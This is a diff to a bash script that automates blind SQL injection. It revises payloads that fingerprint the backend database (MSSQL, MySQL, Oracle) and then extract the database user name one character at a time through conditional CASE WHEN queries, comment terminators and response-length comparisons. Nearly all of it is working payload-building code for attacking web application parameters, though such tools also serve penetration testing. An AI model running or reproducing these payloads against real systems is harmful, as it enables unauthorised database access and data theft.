@@ -206,7 +206,7 @@ lastchar="${payload: -1}"
 if [[ "$lastchar" == "-" ]] ; then
 	end="--"
 elif [[ "$lastchar" == "#" ]] ; then
-	end="-- "
+	end="-- #"
 else
 	end=""
 fi
@@ -366,7 +366,7 @@ if [[ "$selectsuccess" == 0 ]] ; then
 		echo "[UNION SELECT: $colno COL REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
 	
 		selectsuccess=1
-		oracledb=1
+		dbms="oracle"
 	fi
 fi
 
@@ -568,10 +568,13 @@ fi
 dbtypecheck()
 {
 # try to figure out the backend db using conditional tests:
-echo "Running conditional tests to determine DB type"
 
-#if [[ "$dbms" == "" ]]
-
+#beginning of dbms enumeration if statement:
+if [[ "$dbms" != "" ]] ; then
+	echo "DBMS already specified as $dbms"
+else
+	echo "Running conditional tests to determine DB type"
+fi
 #mssqlcheck - only works on numeric params
 badparams=`echo "$cleanoutput" | replace "$testpayload" "1/(case when (ascii(substring((select system_user),1,1)) > 0) then 1 else 0 end)$end"`
 encodeinput=$badparams
@@ -596,7 +599,7 @@ if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
 	echoreporter
 	dbms="mssql"
 	numerator="1 or 789=789"
-	lettergrab
+	#lettergrab
 fi
 if [[ "$status_true" == "$status_false" ]] ; then
 	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then
@@ -605,7 +608,7 @@ if [[ "$status_true" == "$status_false" ]] ; then
 		echoreporter
 		dbms="mssql"
 		numerator="1 or 789=789"
- 		lettergrab
+ 		#lettergrab
 	fi
 fi
 
@@ -633,7 +636,7 @@ if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
 	echoreporter
 	dbms="mssql"
 	numerator="a' or 789=789"
-	lettergrab
+	#lettergrab
 fi
 if [[ "$status_true" == "$status_false" ]] ; then
 	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then
@@ -642,7 +645,7 @@ if [[ "$status_true" == "$status_false" ]] ; then
 		echoreporter
 		dbms="mssql"
 		numerator="a' or 789=789"
- 		lettergrab
+ 		#lettergrab
 	fi
 fi
 
@@ -670,7 +673,7 @@ if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
 	echoreporter
 	dbms="mysql"
 	numerator="789=789"
-	lettergrab
+	#lettergrab
 fi
 if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
@@ -680,7 +683,7 @@ if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 		echoreporter
 		dbms="mysql"
 		numerator="789=789"
- 		lettergrab
+ 		#lettergrab
 	fi
 fi
 
@@ -706,7 +709,7 @@ if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
 	echoreporter
 	numerator="1' or 789"
 	dbms="mysql"
- 	lettergrab
+ 	#lettergrab
 fi
 if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
@@ -716,20 +719,20 @@ if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 		echoreporter
 		dbms="mysql"
 		numerator="1' or 789"
- 		lettergrab
+ 		#lettergrab
 	fi
 fi
 
 
 #oraclecheck - only works on numeric params
-badparams=`echo "$cleanoutput" | replace "$testpayload" "1/(case when (ascii(substr((select user from dual),1,1)) > 0) then 1 else 0 end)$end"`
+badparams=`echo "$cleanoutput" | replace "$testpayload" "1 or 1=(case when (ascii(substr((select user from dual),1,1)) > 0) then 1 else 0 end)$end"`
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
 requester
 status_true=`echo $response | cut -d ":" -f 1`
 length_true=`echo $response | cut -d ":" -f 2`
-badparams=`echo "$cleanoutput" | replace "$testpayload" "1/(case when (ascii(substr((select user from dual),1,1)) > 255) then 1 else 0 end)$end"`
+badparams=`echo "$cleanoutput" | replace "$testpayload" "1 or 1=(case when (ascii(substr((select user from dual),1,1)) > 255) then 1 else 0 end)$end"`
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
@@ -742,8 +745,8 @@ if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
 	dbms="oracle"
 	remessage="STATUS DIFF T:$status_true F:$status_false DB is ORACLE"
 	echoreporter
-	numerator="1 or 789=789"
-	lettergrab
+	numerator="1 or 789"
+	#lettergrab
 fi
 if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
@@ -752,20 +755,20 @@ if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 		dbms="oracle"
 		remessage="LENGTH DIFF EQUALS $lendiff DB is ORACLE"
 		echoreporter
-		numerator="1 or 789=789"
-		lettergrab
+		numerator="1 or 789"
+		#lettergrab
 	fi
 fi
 
-#oraclecheck - only works on numeric params
-badparams=`echo "$cleanoutput" | replace "$testpayload" "1/(case when (ascii(substr((select user from dual),1,1)) > 0) then 1 else 0 end)$end"`
+#oraclecheck - only works on string params
+badparams=`echo "$cleanoutput" | replace "$testpayload" "a' or 789/(case when (ascii(substr((select user from dual),1,1)) > 0) then 789 else 0 end)$end"`
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
 requester
 status_true=`echo $response | cut -d ":" -f 1`
 length_true=`echo $response | cut -d ":" -f 2`
-badparams=`echo "$cleanoutput" | replace "$testpayload" "1/(case when (ascii(substr((select user from dual),1,1)) > 255) then 1 else 0 end)$end"`
+badparams=`echo "$cleanoutput" | replace "$testpayload" "a' or 789/(case when (ascii(substr((select user from dual),1,1)) > 255) then 789 else 0 end)$end"`
 encodeinput=$badparams
 encodeme
 badparams=$encodeoutput
@@ -777,9 +780,9 @@ if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
 	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams" 
 	dbms="oracle"
 	remessage="STATUS DIFF T:$status_true F:$status_false DB is ORACLE"
-	numerator="1' or 789=789"
+	numerator="1' or 789"
 	echoreporter
-	lettergrab
+	#lettergrab
 fi
 if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
@@ -787,12 +790,17 @@ if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 		#tput sgr0 # Reset attributes.
 		dbms="oracle"
 		remessage="LENGTH DIFF EQUALS $lendiff DB is ORACLE"
-		numerator="1' or 789=789"
+		numerator="1' or 789"
 		echoreporter
-		lettergrab
+		#lettergrab
 	fi
 fi
+#end of dbms enumeraton if statement
+lettergrab
 
+if [[ "$dbms" == "" ]] ; then
+	echo "Could not determine DBMS"	
+fi
 }
 
 lettergrab()
@@ -809,7 +817,7 @@ while [[ $oflag -lt $horiz ]] ; do
 		elif [[ $dbms == "mysql" ]] ; then
 			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (length(system_user()) = 999) then 789 else 0 end)$end"`
 		elif [[ $dbms == "oracle" ]] ; then
-			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/case when length((select user from dual)) = 9 then 789 else 0 end$end"`
+			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator=case when length((select user from dual)) = 999 then 789 else 0 end$end"`
 		else
 			echo "Unable to determine DBMS"
 			oflag=40
@@ -818,7 +826,7 @@ while [[ $oflag -lt $horiz ]] ; do
 		encodeme
 		badparams=$encodeoutput
 		requester
-		#echo "debug false $request"
+		echo "debug false $request"
 		status_false=`echo $response | cut -d ":" -f 1`
 		length_false=`echo $response | cut -d ":" -f 2` 
 	fi
@@ -828,13 +836,13 @@ while [[ $oflag -lt $horiz ]] ; do
 	elif [[ $dbms == "mysql" ]] ; then
 		badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (length(system_user()) = $oflag) then 789 else 0 end)$end"`
 	elif [[ $dbms == "oracle" ]] ; then
-		badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/case when length((select user from dual)) = $oflag then 789 else 0 end$end"`
+		badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator=case when length((select user from dual)) = $oflag then 789 else 0 end$end"`
 	else
 		echo "Unable to determine DBMS"
 		oflag=40
 	fi
 
-	#echo "debug true $request"
+	echo "debug true $request"
 		
 	encodeinput=$badparams
 	encodeme
@@ -878,7 +886,7 @@ if [[ $gotlength == 1 ]] ; then
 			elif [[ $dbms == "mysql" ]] ; then
 				badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = 999) then 678 else 0 end)$end"`
 			elif [[ $dbms == "oracle" ]] ; then
-				badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/case when ascii(substr((select user from dual),$oflag,1)) = 999 then 678 else 0 end$end"`
+				badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator=case when ascii(substr((select user from dual),$oflag,1)) = 999 then 678 else 0 end$end"`
 			else
 				echo "Unable to determine DBMS"
 				oflag=40
@@ -896,7 +904,7 @@ if [[ $gotlength == 1 ]] ; then
 		elif [[ $dbms == "mysql" ]] ; then
 			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = $iflag) then 789 else 0 end)$end"`
 		elif [[ $dbms == "oracle" ]] ; then
-			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/case when ascii(substr((select user from dual),$oflag,1)) = $iflag then 789 else 0 end$end"`
+			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator=case when ascii(substr((select user from dual),$oflag,1)) = $iflag then 789 else 0 end$end"`
 		else
 			echo "Unable to determine DBMS"
 			oflag=40
@@ -2406,11 +2414,11 @@ cat cleanscannerinputlist.txt | while read i; do
 					done
 					#end of subsection that scans for common error strings									
 					#beginning of response lenth diffing section
-					if [[ "$payload" =~ "345=345" || "$payload" =~ "345'='345" || "$payload" =~ "dfth=dfth" ]]
+					if [[ "$payload" =~ "345" || "$payload" =~ "dfth" ]]
 						then SQLequallength=`echo $and1eq2 | cut -d ":" -f 2`
 					fi
 
-					if [[ "$payload" =~ "345=456" || "$payload" =~ "345'='456" || "$payload" =~ "dfth=fghj" ]]
+					if [[ "$payload" =~ "456" || "$payload" =~ "fghi" ]]
 						then SQLunequallength=`echo $and1eq2 | cut -d ":" -f 2`
 					fi
 
